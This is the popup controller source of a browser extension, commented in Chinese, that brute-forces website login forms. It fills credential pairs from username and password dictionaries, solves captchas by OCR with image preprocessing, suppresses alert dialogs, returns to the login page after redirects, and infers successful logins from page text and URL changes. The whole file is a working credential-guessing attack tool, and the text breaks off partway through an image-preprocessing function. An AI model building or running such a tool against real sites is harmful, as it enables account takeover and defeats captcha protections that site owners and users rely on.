// popup.js — 主控制器：UI 交互、攻击循环、OCR、持久化

// ====================== 全局状态 ======================
const state = {
  status: 'idle',          // idle | running | paused | completed
  tabId: null,
  frameId: 0,              // 登录表单所在的 frame ID（0 = 主框架）
  isPicking: false,
  loginUrl: '',            // 登录页 URL，用于跳转回来
  selectors: {
    username: '',
    password: '',
    captchaInput: '',
    captchaImg: '',
    submit: '',
  },
  config: {
    delay: 1500,
    failIndicator: '',
    successIndicator: '',
    captchaEnabled: true,
    refreshCaptcha: true,
    ocrMode: 'manual',     // manual | auto
  },
  dictUsername: '',
  dictPassword: '',
  currentIndex: 0,
  totalCombinations: 0,
  results: [],
};

let captchaResolve = null;  // 手动验证码输入的 Promise resolve

// ====================== 初始化 ======================
document.addEventListener('DOMContentLoaded', async () => {
  await loadSavedData();
  await initTab();
  setupTabs();
  setupEventListeners();
  updateUI();
  tryLoadTesseract();
});

async function loadSavedData() {
  const saved = await chrome.storage.local.get([
    'selectors', 'config', 'dictUsername', 'dictPassword', 'results', 'frameId',
  ]);
  if (saved.selectors) Object.assign(state.selectors, saved.selectors);
  if (saved.config) Object.assign(state.config, saved.config);
  if (saved.dictUsername != null) state.dictUsername = saved.dictUsername;
  if (saved.dictPassword != null) state.dictPassword = saved.dictPassword;
  if (saved.results) state.results = saved.results;
  if (saved.frameId != null) state.frameId = saved.frameId;
}

async function initTab() {
  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (tab) {
    state.tabId = tab.id;
    await ensureContentScript();
  }
}

async function ensureContentScript() {
  try {
    const resp = await sendToContent('PING');
    if (resp && resp.pong) return true;
  } catch { /* not injected yet */ }

  // 尝试注入（包括所有 iframe）
  try {
    await chrome.scripting.executeScript({
      target: { tabId: state.tabId, allFrames: true },
      files: ['content/content.js'],
    });
    // 等待脚本初始化
    await sleep(300);
    // 验证注入成功（至少主框架能 PING 通）
    try {
      const resp = await sendToFrame(state.tabId, 0, 'PING');
      if (resp && resp.pong) return true;
    } catch { /* 主框架可能是跨域页面，检查当前 frameId */ }
    // 尝试当前 frameId
    try {
      const resp = await sendToContent('PING');
      if (resp && resp.pong) return true;
    } catch {}
  } catch (e) {
    throw new Error('无法注入脚本，请刷新目标页面后重试（' + e.message + '）');
  }
  throw new Error('脚本注入后无响应，请刷新目标页面后重试');
}

// 检查当前页面是否还在登录页，如果被重定向了则自动返回
async function ensureLoginPage() {
  if (!state.loginUrl) return;
  try {
    const tab = await chrome.tabs.get(state.tabId);
    const currentUrl = tab.url;
    // URL 不同说明页面跳转了
    if (currentUrl !== state.loginUrl) {
      addLog('检测到页面跳转: ' + currentUrl.substring(0, 60) + '...', 'warn');
      addLog('正在返回登录页...', '');
      await chrome.tabs.update(state.tabId, { url: state.loginUrl });
      // 等待页面加载完成
      await waitForPageLoad(state.tabId);
      // 重新注入 content script
      await sleep(500);
      await ensureContentScript();
      addLog('已返回登录页', 'success');
    }
  } catch (e) {
    addLog('检查页面URL失败: ' + e.message, 'warn');
  }
}

// 等待标签页加载完成
function waitForPageLoad(tabId) {
  return new Promise((resolve) => {
    const timeout = setTimeout(() => {
      chrome.tabs.onUpdated.removeListener(listener);
      resolve();
    }, 10000);

    function listener(updatedTabId, changeInfo) {
      if (updatedTabId === tabId && changeInfo.status === 'complete') {
        clearTimeout(timeout);
        chrome.tabs.onUpdated.removeListener(listener);
        resolve();
      }
    }
    chrome.tabs.onUpdated.addListener(listener);
  });
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function tryLoadTesseract() {
  const script = document.createElement('script');
  script.src = '../lib/tesseract.min.js';
  script.onload = () => {
    if (typeof Tesseract !== 'undefined') {
      state.config.ocrMode = 'auto';
      $('ocr-status').textContent = 'Tesseract.js 已加载 — 自动识别模式';
      $('ocr-status').className = 'ocr-status available';
      // 预热：提前下载语言包
      preloadOCR();
    }
  };
  script.onerror = () => {
    $('ocr-status').textContent = '手动输入模式（将 tesseract.min.js 放入 lib/ 可启用自动识别）';
    $('ocr-status').className = 'ocr-status manual';
  };
  document.head.appendChild(script);
}

let cachedWorker = null;
let lastWhitelist = '';
const WHITELIST_ALNUM = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ+-=';
const WHITELIST_DIGITS = '0123456789';

async function getOCRWorker(whitelist) {
  whitelist = whitelist || WHITELIST_ALNUM;
  if (cachedWorker && lastWhitelist === whitelist) return cachedWorker;
  if (!cachedWorker) {
    cachedWorker = await Tesseract.createWorker('eng', 1, {
      workerBlobURL: false,
      workerPath: chrome.runtime.getURL('lib/worker.min.js'),
      corePath: chrome.runtime.getURL('lib/tesseract-core-simd.wasm.js'),
      langPath: 'https://tessdata.projectnaptha.com/4.0.0',
      logger: (m) => {
        if (m.status === 'recognizing text') {
          $('ocr-status').textContent = 'OCR 识别中... ' + Math.round(m.progress * 100) + '%';
        }
      },
    });
  }
  await cachedWorker.setParameters({
    tessedit_char_whitelist: whitelist,
    tessedit_pageseg_mode: '7',
  });
  lastWhitelist = whitelist;
  return cachedWorker;
}

async function preloadOCR() {
  try {
    await getOCRWorker(WHITELIST_ALNUM);
    $('ocr-status').textContent = 'Tesseract.js 就绪 — 自动识别模式';
    $('ocr-status').className = 'ocr-status available';
  } catch (e) {
    $('ocr-status').textContent = 'OCR 初始化失败: ' + e.message;
    $('ocr-status').className = 'ocr-status manual';
    state.config.ocrMode = 'manual';
  }
}

// ====================== 标签页切换 ======================
function setupTabs() {
  document.querySelectorAll('.tab').forEach((tab) => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.tab').forEach((t) => t.classList.remove('active'));
      document.querySelectorAll('.tab-content').forEach((c) => c.classList.remove('active'));
      tab.classList.add('active');
      $('tab-' + tab.dataset.tab).classList.add('active');
    });
  });
}

// ====================== 事件绑定 ======================
function setupEventListeners() {
  // 配置页
  $('btn-auto-detect').addEventListener('click', onAutoDetect);
  $('btn-preview').addEventListener('click', onPreview);
  document.querySelectorAll('.pick').forEach((btn) => {
    btn.addEventListener('click', () => onPick(btn.dataset.target));
  });
  // 选择器输入框手动编辑后保存
  ['sel-username', 'sel-password', 'sel-captcha-input', 'sel-captcha-img', 'sel-submit'].forEach((id) => {
    $(id).addEventListener('change', onSelectorManualEdit);
  });

  // 字典页
  $('btn-load-user-file').addEventListener('click', () => $('file-username').click());
  $('btn-load-pwd-file').addEventListener('click', () => $('file-password').click());
  $('file-username').addEventListener('change', (e) => loadDictFile(e, 'username'));
  $('file-password').addEventListener('change', (e) => loadDictFile(e, 'password'));
  $('dict-username').addEventListener('input', onDictChange);
  $('dict-password').addEventListener('input', onDictChange);

  // 设置页
  ['delay', 'fail-indicator', 'success-indicator'].forEach((id) => {
    $(id).addEventListener('change', onSettingChange);
  });
  $('chk-captcha').addEventListener('change', onSettingChange);
  $('chk-refresh-captcha').addEventListener('change', onSettingChange);

  // 攻击页
  $('btn-start').addEventListener('click', onStart);
  $('btn-pause').addEventListener('click', onPause);
  $('btn-stop').addEventListener('click', onStop);
  $('btn-clear-log').addEventListener('click', () => { $('log').innerHTML = ''; });
  $('btn-clear-results').addEventListener('click', onClearResults);
  $('captcha-confirm').addEventListener('click', onCaptchaConfirm);
  $('captcha-manual-input').addEventListener('keydown', (e) => {
    if (e.key === 'Enter') onCaptchaConfirm();
  });

  // 来自 content script 的消息（元素拾取回调）
  chrome.runtime.onMessage.addListener((msg) => {
    if (msg.type === 'ELEMENT_PICKED') {
      onElementPicked(msg.elementType, msg.selector);
    } else if (msg.type === 'PICK_CANCELLED') {
      state.isPicking = false;
      updatePickButtons();
    }
  });
}

// ====================== 配置页事件 ======================
async function onAutoDetect() {
  const btn = $('btn-auto-detect');
  btn.disabled = true;
  btn.textContent = '识别中...';
  try {
    await ensureContentScript();
  } catch (err) {
    showStatus(err.message, 'error');
    btn.disabled = false;
    btn.textContent = '自动识别';
    return;
  }
  try {
    // 获取当前标签的所有 frame（主框架 + iframe）
    let frames = null;
    if (chrome.webNavigation && chrome.webNavigation.getAllFrames) {
      try {
        frames = await chrome.webNavigation.getAllFrames({ tabId: state.tabId });
      } catch { /* 权限不足或 API 不可用 */ }
    }

    let bestResult = null;
    let bestFrameId = 0;
    let bestCount = 0;

    if (frames && frames.length > 0) {
      // 多 frame 模式：遍历所有 frame 找最佳
      for (const frame of frames) {
        try {
          const r = await sendToFrame(state.tabId, frame.frameId, 'AUTO_DETECT');
          const count = ['username', 'password', 'captchaInput', 'captchaImg', 'submit']
            .filter((k) => r[k]).length;
          if (count > bestCount) {
            bestCount = count;
            bestResult = r;
            bestFrameId = frame.frameId;
          }
        } catch {
          // 该 frame 可能不可访问（跨域、未注入等），跳过
        }
      }
    } else {
      // 降级：仅检测主框架
      bestResult = await sendToContent('AUTO_DETECT');
      bestCount = ['username', 'password', 'captchaInput', 'captchaImg', 'submit']
        .filter((k) => bestResult[k]).length;
      bestFrameId = 0;
    }

    if (!bestResult || bestCount === 0) {
      showStatus('所有框架中均未识别到表单元素（共扫描 ' + frames.length + ' 个框架）', 'warning');
      btn.disabled = false;
      btn.textContent = '自动识别';
      return;
    }

    // 记住登录表单所在的 frameId
    state.frameId = bestFrameId;
    if (bestFrameId !== 0) {
      addLog('登录表单位于 iframe 中 (frameId=' + bestFrameId + ')', '');
    }

    const keys = ['username', 'password', 'captchaInput', 'captchaImg', 'submit'];
    keys.forEach((k) => { if (bestResult[k]) state.selectors[k] = bestResult[k]; });

    // 自动判断是否有验证码：如果未检测到验证码输入框和验证码图片，自动关闭验证码
    const hasCaptcha = !!(bestResult.captchaInput && bestResult.captchaImg);
    state.config.captchaEnabled = hasCaptcha;
    $('chk-captcha').checked = hasCaptcha;
    if (!hasCaptcha) {
      addLog('未检测到验证码，已自动关闭验证码识别', '');
    } else {
      addLog('检测到验证码元素，已自动开启验证码识别', '');
    }

    updateSelectorUI();
    saveData();
    await sendToContent('HIGHLIGHT_ELEMENTS', { selectors: state.selectors });
    showStatus('自动识别完成：找到 ' + bestCount + '/5 个元素' +
      (hasCaptcha ? '（含验证码）' : '（无验证码）'), 'success');
  } catch (err) {
    showStatus('自动识别失败：' + err.message, 'error');
  }
  btn.disabled = false;
  btn.textContent = '自动识别';
}

async function onPreview() {
  try {
    await ensureContentScript();
    await sendToContent('HIGHLIGHT_ELEMENTS', { selectors: state.selectors });
    showStatus('已在页面上高亮选中元素', 'info');
  } catch (err) {
    showStatus('预览失败：' + err.message, 'error');
  }
}

async function onPick(elementType) {
  if (state.isPicking) {
    await sendToContent('STOP_PICK');
    state.isPicking = false;
    updatePickButtons();
    return;
  }
  state.isPicking = true;
  updatePickButtons(elementType);
  try {
    await ensureContentScript();
    await sendToContent('START_PICK', { elementType });
    showStatus('请在页面上点击选择【' + getLabel(elementType) + '】，ESC 取消', 'info');
  } catch (err) {
    state.isPicking = false;
    updatePickButtons();
    showStatus('选取失败：' + err.message, 'error');
  }
}

function onElementPicked(elementType, selector) {
  state.isPicking = false;
  state.selectors[elementType] = selector;
  updateSelectorUI();
  updatePickButtons();
  saveData();
  showStatus('已选择 ' + getLabel(elementType) + '：' + selector, 'success');
  // 自动开启/关闭验证码：当验证码相关元素被手动选取后，自动同步开关
  syncCaptchaToggle();
}

function onSelectorManualEdit() {
  state.selectors.username = $('sel-username').value.trim();
  state.selectors.password = $('sel-password').value.trim();
  state.selectors.captchaInput = $('sel-captcha-input').value.trim();
  state.selectors.captchaImg = $('sel-captcha-img').value.trim();
  state.selectors.submit = $('sel-submit').value.trim();
  saveData();
  syncCaptchaToggle();
}

// 根据验证码选择器是否填写，自动同步验证码开关
function syncCaptchaToggle() {
  const hasBoth = !!(state.selectors.captchaInput && state.selectors.captchaImg);
  if (hasBoth && !state.config.captchaEnabled) {
    state.config.captchaEnabled = true;
    $('chk-captcha').checked = true;
    saveData();
    addLog('检测到验证码选择器已配置，自动开启验证码识别', '');
  } else if (!hasBoth && state.config.captchaEnabled) {
    state.config.captchaEnabled = false;
    $('chk-captcha').checked = false;
    saveData();
  }
}

// ====================== 字典页事件 ======================
function loadDictFile(event, type) {
  const file = event.target.files[0];
  if (!file) return;
  const reader = new FileReader();
  reader.onload = (e) => {
    const fileText = e.target.result;
    if (type === 'username') {
      const existing = parseDict(state.dictUsername);
      const fromFile = parseDict(fileText);
      const merged = mergeDict(existing, fromFile);
      state.dictUsername = merged.join('\n');
      $('dict-username').value = state.dictUsername;
      updateDictCount('username');
    } else {
      const existing = parseDict(state.dictPassword);
      const fromFile = parseDict(fileText);
      const merged = mergeDict(existing, fromFile);
      state.dictPassword = merged.join('\n');
      $('dict-password').value = state.dictPassword;
      updateDictCount('password');
    }
    saveData();
    showStatus('已加载文件并合并字典（去重后 ' +
      (type === 'username' ? parseDict(state.dictUsername).length : parseDict(state.dictPassword).length) + ' 条）', 'success');
  };
  reader.readAsText(file);
  event.target.value = '';
}

function mergeDict(existing, fromFile) {
  // 如果用户没有自定义输入，直接用文件内容
  if (!existing.length) return fromFile;
  // 否则合并去重，保持顺序：已有的在前，文件新增的在后
  const set = new Set(existing);
  for (const item of fromFile) {
    if (!set.has(item)) {
      existing.push(item);
      set.add(item);
    }
  }
  return existing;
}

function onDictChange() {
  state.dictUsername = $('dict-username').value;
  state.dictPassword = $('dict-password').value;
  updateDictCount('username');
  updateDictCount('password');
  saveData();
}

// ====================== 设置页事件 ======================
function onSettingChange() {
  state.config.delay = parseInt($('delay').value) || 1500;
  state.config.failIndicator = $('fail-indicator').value.trim();
  state.config.successIndicator = $('success-indicator').value.trim();
  state.config.captchaEnabled = $('chk-captcha').checked;
  state.config.refreshCaptcha = $('chk-refresh-captcha').checked;
  saveData();
}

// ====================== 攻击控制 ======================
async function onStart() {
  const usernames = parseDict(state.dictUsername);
  const passwords = parseDict(state.dictPassword);

  if (!usernames.length) return showStatus('请输入至少一个用户名', 'error');
  if (!passwords.length) return showStatus('请输入至少一个密码', 'error');
  if (!state.selectors.username || !state.selectors.password || !state.selectors.submit) {
    return showStatus('请先选择用户名、密码输入框和登录按钮', 'error');
  }

  // 记录登录页 URL，用于页面跳转后返回
  const tab = await chrome.tabs.get(state.tabId);
  state.loginUrl = tab.url;
  addLog('登录页: ' + state.loginUrl, '');

  // 自动检测验证码：如果没配置验证码选择器，自动关闭验证码
  if (!state.selectors.captchaInput || !state.selectors.captchaImg) {
    state.config.captchaEnabled = false;
    $('chk-captcha').checked = false;
  }

  state.status = 'running';
  state.currentIndex = 0;
  state.totalCombinations = usernames.length * passwords.length;

  updateControlUI();
  $('progress-section').hidden = false;
  showStatus('爆破进行中...', 'running');

  // 自动切换到攻击标签页
  document.querySelectorAll('.tab').forEach((t) => t.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach((c) => c.classList.remove('active'));
  document.querySelector('[data-tab="attack"]').classList.add('active');
  $('tab-attack').classList.add('active');

  await runAttack(usernames, passwords);
}

function onPause() {
  if (state.status === 'running') {
    state.status = 'paused';
    showStatus('已暂停', 'warning');
    $('btn-pause').textContent = '继续';
  } else if (state.status === 'paused') {
    state.status = 'running';
    showStatus('继续爆破...', 'running');
    $('btn-pause').textContent = '暂停';
  }
  updateControlUI();
}

function onStop() {
  state.status = 'idle';
  updateControlUI();
  showStatus('已停止', 'idle');
  // 清理 alert 拦截状态
  try { sendToContent('DISABLE_ALERT_INTERCEPT'); } catch (e) {}
}

function onClearResults() {
  state.results = [];
  saveData();
  renderResults();
}

// ====================== 攻击循环 ======================
async function runAttack(usernames, passwords) {
  let idx = 0;

  for (let u = 0; u < usernames.length; u++) {
    for (let p = 0; p < passwords.length; p++) {
      // 暂停等待
      while (state.status === 'paused') await sleep(300);
      if (state.status !== 'running') return;

      const username = usernames[u];
      const password = passwords[p];
      state.currentIndex = idx;

      updateProgress(idx, state.totalCombinations, username, password);

      try {
        const result = await executeOneTrial(username, password);

        if (result.loginResult === 'success' || result.loginResult === 'possible_success') {
          state.results.push({
            username, password,
            result: result.loginResult,
            time: new Date().toLocaleString(),
          });
          saveData();
          renderResults();

          if (result.loginResult === 'success') {
            addLog('成功! ' + username + ' : ' + password, 'success');
            state.status = 'completed';
            showStatus('爆破成功! 用户名: ' + username + '  密码: ' + password, 'success');
            updateControlUI();
            return;
          }
          addLog('可能成功: ' + username + ' : ' + password + ' (' + (result.reason || '') + ')', 'warn');
        } else {
          addLog('[' + (idx + 1) + '/' + state.totalCombinations + '] ' +
            username + ' : ' + password + ' → 失败', '');
        }
      } catch (err) {
        addLog('错误: ' + username + ' : ' + password + ' → ' + err.message, 'error');
      }

      // 检查页面是否跳转了（登录失败导致的重定向）
      await ensureLoginPage();

      idx++;

      // 两次尝试之间的延迟
      if (state.status === 'running') await sleep(state.config.delay);
    }
  }

  if (state.status === 'running') {
    state.status = 'completed';
    showStatus('爆破完成，未找到有效凭据', 'warning');
    updateControlUI();
  }
}

async function executeOneTrial(username, password) {
  await ensureContentScript();

  // 0. 启用 alert 拦截（防止 AJAX 登录页的 alert 阻塞流程）
  await sendToContent('ENABLE_ALERT_INTERCEPT');

  // 1. 刷新验证码并识别（带重试机制）
  if (state.config.captchaEnabled && state.selectors.captchaImg && state.selectors.captchaInput) {
    const maxCaptchaRetries = 3;
    let captchaFilled = false;

    for (let retry = 0; retry < maxCaptchaRetries && !captchaFilled; retry++) {
      if (retry > 0) addLog('验证码重试第 ' + retry + ' 次...', 'warn');

      // 刷新验证码
      if (state.config.refreshCaptcha || retry > 0) {
        addLog('刷新验证码...', '');
        await sendToContent('REFRESH_CAPTCHA', { selector: state.selectors.captchaImg });
        await sleep(1200);
      }

      // 截图
      const capture = await sendToContent('CAPTURE_CAPTCHA', { selector: state.selectors.captchaImg });
      if (!capture.success || !capture.dataUrl) {
        addLog('验证码截图失败: ' + (capture.error || '无数据'), 'error');
        await sleep(500);
        continue;
      }

      // 检查截图是否为空白/极小
      if (capture.dataUrl.length < 200) {
        addLog('验证码图片数据太小 (' + capture.dataUrl.length + ' bytes)，可能未加载', 'warn');
        await sleep(800);
        continue;
      }

      addLog('验证码截图成功 (' + Math.round(capture.dataUrl.length / 1024) + ' KB)', '');

      // OCR 识别
      let captchaText;
      if (state.config.ocrMode === 'auto' && typeof Tesseract !== 'undefined') {
        captchaText = await ocrCaptcha(capture.dataUrl);
      } else {
        captchaText = await requestManualCaptcha(capture.dataUrl);
      }

      // 验证 OCR 结果
      if (!captchaText || captchaText.length === 0) {
        addLog('验证码识别为空', 'warn');
        continue;
      }

      // 长度检测：常见验证码 4-6 位，太短或太长可能误识
      if (captchaText.length < 3 || captchaText.length > 8) {
        addLog('验证码长度异常(' + captchaText.length + '位): ' + captchaText + '，重试', 'warn');
        continue;
      }

      addLog('验证码: ' + captchaText, 'success');
      await sendToContent('FILL_INPUT', {
        selector: state.selectors.captchaInput,
        value: captchaText,
      });
      await sleep(200);
      captchaFilled = true;
    }

    if (!captchaFilled) {
      addLog('验证码多次识别失败，跳过本次尝试', 'error');
      await sendToContent('DISABLE_ALERT_INTERCEPT');
      return { loginResult: 'fail', reason: '验证码识别失败' };
    }
  }

  // 2. 填写用户名
  await sendToContent('FILL_INPUT', {
    selector: state.selectors.username,
    value: username,
  });
  await sleep(200);

  // 3. 填写密码
  await sendToContent('FILL_INPUT', {
    selector: state.selectors.password,
    value: password,
  });
  await sleep(200);

  // 4. 点击登录按钮
  await sendToContent('CLICK_ELEMENT', {
    selector: state.selectors.submit,
  });

  // 5. 等待 AJAX 响应或页面跳转
  await sleep(2000);

  // 6. 检测结果
  const FAIL_RE = /错误|失败|有误|不正确|不匹配|不存在|密码错|账号错|用户名或密码|登录错|认证失败|无效|拒绝|禁止|账户锁|验证码错|error|fail|wrong|invalid|incorrect|denied|forbidden|unauthorized|locked|mismatch/i;

  for (let attempt = 0; attempt < 10; attempt++) {
    try {
      await ensureContentScript();

      // --- alert 检测 ---
      const alertResult = await sendToContent('GET_ALERT_MESSAGE');
      if (alertResult.intercepted) {
        const alertMsg = alertResult.message || '';
        addLog('Alert: ' + alertMsg, 'warn');
        await sendToContent('DISABLE_ALERT_INTERCEPT');
        await sleep(800);

        // 用户自定义关键词优先
        if (state.config.successIndicator && alertMsg.includes(state.config.successIndicator)) {
          return { loginResult: 'success', reason: 'alert: ' + alertMsg };
        }
        if (state.config.failIndicator && alertMsg.includes(state.config.failIndicator)) {
          return { loginResult: 'fail', reason: 'alert: ' + alertMsg };
        }
        // 包含失败关键词 = 失败
        if (FAIL_RE.test(alertMsg)) {
          return { loginResult: 'fail', reason: 'alert: ' + alertMsg };
        }
        // alert 内容没有失败关键词，可能是成功提示
        return { loginResult: 'success', reason: 'alert(无失败关键词): ' + alertMsg };
      }

      // --- 页面内容检测 ---
      await sendToContent('DISABLE_ALERT_INTERCEPT');
      const pageResult = await sendToContent('CHECK_RESULT', {
        failText: state.config.failIndicator,
        successText: state.config.successIndicator,
        formSelector: state.selectors.username,
      });

      // 如果 content.js 已经给出明确结果（用户自定义关键词命中）
      if (pageResult.loginResult === 'success' || pageResult.loginResult === 'fail') {
        return pageResult;
      }

      // __pending__：需要 popup 综合判断
      const pageText = pageResult.pageText || '';
      const currentUrl = pageResult.pageUrl || '';
      const formExists = pageResult.formExists;
      const urlChanged = state.loginUrl && currentUrl !== state.loginUrl;

      // 情况 1：页面文本包含失败关键词（无论是否跳转）→ 失败
      if (FAIL_RE.test(pageText)) {
        const matched = pageText.match(FAIL_RE);
        return { loginResult: 'fail', reason: '页面包含: "' + (matched ? matched[0] : '') + '"' };
      }

      // 情况 2：URL 变了 + 页面没有失败关键词 → 成功
      if (urlChanged) {
        addLog('页面跳转到: ' + currentUrl.substring(0, 80), '');
        return { loginResult: 'success', reason: '跳转且无失败提示: ' + currentUrl.substring(0, 80) };
      }

      // 情况 3：表单还在 + URL 没变 + 没有失败文本 → 可能是 AJAX 登录未响应，继续等待
      if (formExists === true) {
        // 前几次尝试继续等，最后一次判为失败
        if (attempt >= 5) {
          return { loginResult: 'fail', reason: '登录表单仍存在，未检测到响应' };
        }
        await sleep(500);
        continue;
      }

      // 情况 4：表单消失 + URL 没变 + 没有失败文本 → 可能成功（SPA跳转）
      if (formExists === false) {
        return { loginResult: 'success', reason: '表单消失且无失败提示' };
      }

      // 默认：无法确定，继续重试
      await sleep(500);
    } catch {
      await sleep(500);
    }
  }

  // 确保恢复 alert
  try { await sendToContent('DISABLE_ALERT_INTERCEPT'); } catch {}
  return { loginResult: 'unknown', reason: '无法检测结果' };
}

// ====================== OCR ======================
async function ocrCaptcha(imageDataUrl) {
  try {
    addLog('正在 OCR 识别验证码...', '');

    // 测量原始图片尺寸并记录缩放倍数
    const imgDim = await new Promise((resolve) => {
      const img = new Image();
      img.onload = () => resolve({ w: img.width, h: img.height });
      img.onerror = () => resolve({ w: 0, h: 0 });
      img.src = imageDataUrl;
    });
    const adScale = getAdaptiveScale(imgDim.h);
    addLog('  原图尺寸: ' + imgDim.w + 'x' + imgDim.h + ', 缩放: ' + adScale + 'x', '');

    // 用多策略预处理
    const strategies = [
      { name: '直接放大', fn: preprocessDirect },
      { name: '颜色过滤', fn: preprocessColorFilter },
      { name: '固定阈值', fn: preprocessFixedThreshold },
      { name: 'Otsu二值化', fn: preprocessGrayscale },
    ];

    // 第一轮：用字母数字白名单识别
    const worker = await getOCRWorker(WHITELIST_ALNUM);
    const candidates = [];
    const preprocessedImages = [];
    for (const strategy of strategies) {
      try {
        const processed = await strategy.fn(imageDataUrl);
        preprocessedImages.push({ name: strategy.name, dataUrl: processed });
        const { data: { text, confidence } } = await worker.recognize(processed);
        const cleaned = text.trim().replace(/[\s\n\r]+/g, '').replace(/[^0-9a-zA-Z+\-=]/g, '');
        if (cleaned.length >= 2 && cleaned.length <= 8) {
          candidates.push({ text: cleaned, confidence, strategy: strategy.name, mode: 'alnum' });
          addLog('  ' + strategy.name + ': ' + cleaned + ' (置信度:' + Math.round(confidence) + ')', '');
        } else {
          addLog('  ' + strategy.name + ': 结果无效 "' + cleaned + '" (长度:' + cleaned.length + ')', '');
        }
      } catch (e) {
        addLog('  ' + strategy.name + ': 异常 ' + e.message, 'error');
      }
    }

    // 判断是否全数字验证码：如果多数候选结果看起来是纯数字，则用纯数字白名单再识别一轮
    const digitCandidates = candidates.filter(c => /^\d+$/.test(c.text));
    const isLikelyNumeric = digitCandidates.length >= candidates.length * 0.5 && candidates.length > 0;

    if (isLikelyNumeric && preprocessedImages.length > 0) {
      addLog('  [检测到纯数字验证码，启用数字专用模式]', '');
      const digitWorker = await getOCRWorker(WHITELIST_DIGITS);
      for (const img of preprocessedImages) {
        try {
          const { data: { text, confidence } } = await digitWorker.recognize(img.dataUrl);
          const cleaned = text.trim().replace(/[\s\n\r]+/g, '').replace(/[^0-9]/g, '');
          if (cleaned.length >= 2 && cleaned.length <= 8) {
            candidates.push({ text: cleaned, confidence: confidence + 5, strategy: img.name, mode: 'digit' });
            addLog('  ' + img.name + '(数字): ' + cleaned + ' (置信度:' + Math.round(confidence) + ')', '');
          }
        } catch {}
      }
    }

    if (candidates.length === 0) {
      addLog('OCR 失败，切换手动', 'error');
      return requestManualCaptcha(imageDataUrl);
    }

    // 智能选择最佳结果：投票 + 置信度
    const best = selectBestCandidate(candidates);
    addLog('OCR 结果: ' + best.text + ' [' + best.strategy + (best.mode === 'digit' ? '/数字' : '') +
      ', 置信度:' + Math.round(best.confidence) + ']', 'success');
    $('ocr-status').textContent = 'Tesseract.js 就绪 — 自动识别模式';
    return best.text;
  } catch (err) {
    addLog('OCR 异常: ' + err.message, 'error');
    cachedWorker = null;
    lastWhitelist = '';
    return requestManualCaptcha(imageDataUrl);
  }
}

// 智能候选结果选择：相同文本多策略命中加分，然后按分数排序
function selectBestCandidate(candidates) {
  // 统计每个文本被多少策略识别出来
  const voteMap = {};
  for (const c of candidates) {
    if (!voteMap[c.text]) voteMap[c.text] = { votes: 0, totalConf: 0, best: c };
    voteMap[c.text].votes++;
    voteMap[c.text].totalConf += c.confidence;
    if (c.confidence > voteMap[c.text].best.confidence) {
      voteMap[c.text].best = c;
    }
  }

  // 计算综合分数：投票数 * 30 + 平均置信度
  let bestEntry = null;
  for (const text of Object.keys(voteMap)) {
    const entry = voteMap[text];
    entry.score = entry.votes * 30 + (entry.totalConf / entry.votes);
    // 纯数字模式的结果额外加分（数字验证码场景下）
    if (entry.best.mode === 'digit') entry.score += 10;
    if (!bestEntry || entry.score > bestEntry.score) {
      bestEntry = entry;
    }
  }
  return bestEntry.best;
}

// ==================== 图像增强工具函数 ====================

// 3x3 卷积锐化核
function sharpen(d, width, height) {
  const kernel = [0, -1, 0, -1, 5, -1, 0, -1, 0];
  const copy = new Uint8ClampedArray(d.length);
  for (let i = 0; i < d.length; i++) copy[i] = d[i];

  for (let y = 1; y < height - 1; y++) {
    for (let x = 1; x < width - 1; x++) {
      for (let c = 0; c < 3; c++) {
        let sum = 0;
        let ki = 0;
        for (let dy = -1; dy <= 1; dy++) {
          for (let dx = -1; dx <= 1; dx++) {
            sum += copy[((y + dy) * width + (x + dx)) * 4 + c] * kernel[ki++];
          }
        }
        d[(y * width + x) * 4 + c] = Math.max(0, Math.min(255, sum));
      }
    }
  }
}

// 形态学腐蚀（二值图，黑字白底）—— 缩小白色区域 = 加粗黑色文字
function morphErode(d, width, height) {
  const copy = new Uint8ClampedArray(d.length);
  for (let i = 0; i < d.length; i++) copy[i] = d[i];
  for (let y = 1; y < height - 1; y++) {
    for (let x = 1; x < width - 1; x++) {
      let minVal = 255;
      for (let dy = -1; dy <= 1; dy++) {
        for (let dx = -1; dx <= 1; dx++) {
          const v = copy[((y + dy) * width + (x + dx)) * 4];
          if (v < minVal) minVal = v;
        }
      }
      const idx = (y * width + x) * 4;
      d[idx] = d[idx + 1] = d[idx + 2] = minVal;
    }
  }
}

// 形态学膨胀（二值图，黑字白底）—— 扩大白色区域 = 去除小黑噪点
function morphDilate(d, width, height) {
  const copy = new Uint8ClampedArray(d.length);
  for (let i = 0; i < d.length; i++) copy[i] = d[i];
  for (let y = 1; y < height - 1; y++) {
    for (let x = 1; x < width - 1; x++) {
      let maxVal = 0;
      for (let dy = -1; dy <= 1; dy++) {
        for (let dx = -1; dx <= 1; dx++) {
          const v = copy[((y + dy) * width + (x + dx)) * 4];
          if (v > maxVal) maxVal = v;
        }
      }
      const idx = (y * width + x) * 4;
      d[idx] = d[idx + 1] = d[idx + 2] = maxVal;
    }
  }
}

// ==================== 预处理策略 ====================

// 自适应缩放：确保输出图像高度 >= 150px，小图用更大倍数
function getAdaptiveScale(imgHeight) {
  const targetHeight = 150;
  return Math.max(3, Math.ceil(targetHeight / imgHeight));
}

// 策略 0：直接放大 + 锐化 —— 最小预处理但增强边缘
function preprocessDirect(dataUrl) {
  return new Promise((resolve) => {
    const img = new Image();
    img.onload = () => {
      const scale = getAdaptiveScale(img.height);
      const pad = 10;
      const w = img.width * scale;
      const h = img.height * scale;
      const canvas = document.createElement('canvas');
      canvas.width = w + pad * 2;
      canvas.height = h + pad * 2;
      const ctx = canvas.getContext('2d');
      ctx.fillStyle = '#fff';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      ctx.imageSmoothingEnabled = true;
      ctx.imageSmoothingQuality = 'high';
      ctx.drawImage(img, pad, pad, w, h);

      const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      const d = imageData.data;

      // 对比度增强
      for (let i = 0; i < d.length; i += 4) {
        for (let c = 0; c < 3; c++) {
          let v = d[i + c];
          v = Math.round((v - 128) * 1.5 + 128);
          d[i + c] = Math.max(0, Math.min(255, v));
        }
      }

      // 锐化：让字符边缘更清晰，减少 9/8、0/O 等混淆
      sharpen(d, canvas.width, canvas.height);

      ctx.putImageData(imageData, 0, 0);
      resolve(canvas.toDataURL('image/png'));
    };
